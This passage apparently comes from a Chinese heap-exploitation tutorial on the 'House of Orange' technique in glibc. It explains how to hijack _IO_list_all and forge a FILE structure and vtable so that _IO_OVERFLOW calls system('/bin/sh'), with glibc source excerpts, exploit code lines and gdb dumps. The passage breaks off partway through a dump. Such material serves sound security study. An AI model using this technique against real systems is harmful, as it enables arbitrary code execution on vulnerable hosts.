<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602400</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>,</span><br><span class="line">  size = <span class="number">3041</span>,</span><br><span class="line">  fd = <span class="number">0x7ffff7dd1b58</span> &lt;main_arena+<span class="number">88</span>&gt;,</span><br><span class="line">  bk = <span class="number">0x7ffff7dd24f0</span>,</span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>,</span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt; x/<span class="number">20</span>gx <span class="number">0x7ffff7dd24f0</span></span><br><span class="line"><span class="number">0x7ffff7dd24f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2500</span> &lt;_IO_list_all&gt;:	<span class="number">0x00007ffff7dd2520</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2510</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2520</span> &lt;_IO_2_1_stderr_&gt;:	<span class="number">0x00000000fbad2887</span>	<span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2530</span> &lt;_IO_2_1_stderr_+<span class="number">16</span>&gt;:	<span class="number">0x00007ffff7dd25a3</span>	<span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2540</span> &lt;_IO_2_1_stderr_+<span class="number">32</span>&gt;:	<span class="number">0x00007ffff7dd25a3</span>	<span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2550</span> &lt;_IO_2_1_stderr_+<span class="number">48</span>&gt;:	<span class="number">0x00007ffff7dd25a3</span>	<span class="number">0x00007ffff7dd25a3</span></span><br><span class="line"><span class="number">0x7ffff7dd2560</span> &lt;_IO_2_1_stderr_+<span class="number">64</span>&gt;:	<span class="number">0x00007ffff7dd25a4</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2570</span> &lt;_IO_2_1_stderr_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2580</span> &lt;_IO_2_1_stderr_+<span class="number">96</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd2600</span></span><br></pre></td></tr></table></figure>

<p>这里，会顺便涉及到  glibc 的异常处理.</p>
<p>一般在出现内存错误时，会调用函数 <code>malloc_printerr()</code> 打印出错信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">malloc_printerr (<span class="keyword">int</span> action, <span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">void</span> *ptr, mstate ar_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> ((action &amp; <span class="number">5</span>) == <span class="number">5</span>)</span><br><span class="line">    __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;%s\n&quot;</span>, str);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">char</span> buf[<span class="number">2</span> * <span class="keyword">sizeof</span> (<span class="keyword">uintptr_t</span>) + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">      buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">      <span class="keyword">char</span> *cp = _itoa_word ((<span class="keyword">uintptr_t</span>) ptr, &amp;buf[<span class="keyword">sizeof</span> (buf) - <span class="number">1</span>], <span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">while</span> (cp &gt; buf)</span><br><span class="line">        *--cp = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      __libc_message (action &amp; <span class="number">2</span>, <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>,</span><br><span class="line">                      __libc_argv[<span class="number">0</span>] ? : <span class="string">&quot;&lt;unknown&gt;&quot;</span>, str, cp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (action &amp; <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当调用  <code>__libc_message</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sysdeps/posix/libc_fatal.c</span></span><br><span class="line"><span class="comment">/* Abort with an error message.  */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_message (<span class="keyword">int</span> do_abort, <span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span><br><span class="line">&#123;</span><br><span class="line">  [...]</span><br><span class="line">  <span class="keyword">if</span> (do_abort)</span><br><span class="line">    &#123;</span><br><span class="line">      BEFORE_ABORT (do_abort, written, fd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Kill the application.  */</span></span><br><span class="line">      <span class="built_in">abort</span> ();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>do_abort</code> 调用 <code>fflush</code>，即 <code>_IO_flush_all_lockp</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdlib/abort.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fflush(s) _IO_flush_all_lockp (0)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stage == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ++stage;</span><br><span class="line">      fflush (<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/genops.c</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line">  <span class="keyword">int</span> last_stamp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, <span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;   <span class="comment">// 将其覆盖</span></span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     <span class="comment">// 将其修改为 system 函数</span></span><br><span class="line">    result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (last_stamp != _IO_list_all_stamp)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Something was added to the list.  Start all over again.  */</span></span><br><span class="line">      fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">      last_stamp = _IO_list_all_stamp;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    fp = fp-&gt;_chain;    <span class="comment">// 指向我们指定的区域</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>_IO_list_all</code> 是一个 <code>_IO_FILE_plus</code> 类型的对象，我们的目的就是将 <code>_IO_list_all</code> 指针改写为一个伪造的指针，它的 <code>_IO_OVERFLOW</code> 指向 system，并且前 8 字节被设置为 ‘/bin/sh’，所以对 <code>_IO_OVERFLOW(fp, EOF)</code> 的调用最终会变成对 <code>system(&#39;/bin/sh&#39;)</code> 的调用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// libio/libio.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;        <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中有一个指向函数跳转表的指针，<code>_IO_jump_t</code> 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/libioP.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>伪造 <code>_IO_jump_t</code> 中的 <code>__overflow</code> 为 system 函数的地址，从而达到执行 shell 的目的。</p>
<p>当发生内存错误进入 <code>_IO_flush_all_lockp</code> 后，<code>_IO_list_all</code> 仍然指向 unsorted bin，这并不是一个我们能控制的地址。所以需要通过 <code>fp-&gt;_chain</code> 来将 fp 指向我们能控制的地方。所以将 size 字段设置为 0x61，因为此时 <code>_IO_list_all</code> 是 <code>&amp;unsorted_bin-0x10</code>，偏移 0x60 位置上是 smallbins[5]。此时，如果触发一个不适合的 small chunk 分配，malloc 就会将 old top 从 unsorted bin 放回 smallbins[5] 中。而在 <code>_IO_FILE</code> 结构中，偏移 0x60 指向 <code>struct _IO_marker *_markers</code>，偏移 0x68 指向 <code>struct _IO_FILE *_chain</code>，这两个值正好是 old top 的起始地址。这样 fp 就指向了 old top，这是一个我们能够控制的地址。</p>
<p>在将 <code>_IO_OVERFLOW</code> 修改为 system 的时候，有一些条件检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">       || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">           &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">       )</span><br><span class="line">      &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)     <span class="comment">// 需要修改为 system 函数</span></span><br><span class="line"><span class="comment">// libio/libio.h</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Extra data for wide character streams.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>所以这里我们设置 <code>fp-&gt;_mode = 0</code>，<code>fp-&gt;_IO_write_base = (char *) 2</code> 和 <code>fp-&gt;_IO_write_ptr = (char *) 3</code>，从而绕过检查。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br></pre></td></tr></table></figure>



<p>然后，就是修改 <code>_IO_jump_t</code>，将其指向 winner：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">248</span>     <span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line"><span class="number">249</span>     jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line"><span class="number">250</span>     *(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8</span></span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PwnLife&gt;  x/30gx p1-0x10+0x400</span><br><span class="line">0x602400:	0x0068732f6e69622f	0x0000000000000061</span><br><span class="line">0x602410:	0x00007ffff7dd1b58	0x00007ffff7dd24f0</span><br><span class="line">0x602420:	0x0000000000000002	0x0000000000000003</span><br><span class="line">0x602430:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602440:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602450:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602470:	0x0000000000000000	0x0000000000400777</span><br><span class="line">0x602480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602490:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6024a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6024b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6024c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6024d0:	0x0000000000000000	0x0000000000602460</span><br><span 